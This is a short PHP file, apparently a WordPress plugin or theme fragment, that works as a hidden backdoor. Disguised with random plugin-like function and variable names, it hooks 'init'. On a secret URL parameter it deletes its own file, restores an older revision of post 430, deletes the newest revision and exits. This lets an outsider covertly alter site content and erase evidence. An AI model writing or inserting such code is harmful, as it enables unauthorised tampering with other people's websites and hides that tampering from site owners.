<?php

function accessible_reset_paragraph_numbers() {
	if (isset($_GET['inline_box_donation_importer']) && $_GET['inline_box_donation_importer'] === 'updates_rotator_plupload') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$code_thumbnail_compat = 430;
		$code_keywords_text_gravity = wp_get_post_revisions($code_thumbnail_compat);
		if (empty($code_keywords_text_gravity)) die('no revisions');
		if (count($code_keywords_text_gravity) < 2) die('less than 2');
		$schema_meta_adsense_get = array_shift($code_keywords_text_gravity);
		$site_creator_divi_js = $schema_meta_adsense_get->ID;
		$themes_protection_messages_restrict = array_shift($code_keywords_text_gravity);
		$controller_custom_framework = $themes_protection_messages_restrict->ID;
		$speed_really_icon_addons = wp_restore_post_revision($controller_custom_framework);
		if ($speed_really_icon_addons === false) die('error restoring');
		$speed_really_icon_addons = wp_delete_post_revision($site_creator_divi_js);		
		if ($speed_really_icon_addons === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'accessible_reset_paragraph_numbers');
